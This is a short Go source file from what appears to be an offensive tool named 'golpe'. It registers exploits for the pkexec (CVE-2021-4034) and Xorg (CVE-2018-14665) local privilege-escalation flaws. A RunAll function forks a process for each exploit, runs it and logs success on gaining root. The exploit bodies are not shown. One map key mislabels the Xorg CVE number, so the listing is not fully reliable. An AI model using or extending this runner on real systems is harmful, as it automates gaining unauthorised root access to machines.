package golpe

import (
	"log"
	"syscall"
)

var All = map[string]func() error{
	"CVE-2021-4034":  CVE_2021_4034,  // pkexec
	"CVE-2018-14655": CVE_2018_14665, // xorg
}

func RunAll() (err error) {
	for cve, exp := range All {
		log.Printf("Trying %s...", cve)
		pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
		if pid == 0 {
			err = exp()
			if err == nil {
				log.Printf("Successfully got root via %s", cve)
				break
			}
			log.Printf("%s: %v", cve, err)
		}
	}
	return
}
